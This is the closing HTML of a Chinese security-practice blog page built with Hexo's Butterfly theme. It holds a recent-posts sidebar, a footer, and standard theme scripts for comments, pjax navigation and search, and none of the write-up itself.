fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2023/06/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%20%C2%96Alfred/'
+    this.page.identifier = '/2023/06/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80)%E4%B9%8BTHM%20%C2%96Alfred/'
+    this.page.title = '打靶记录(一)之THMAlfred'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
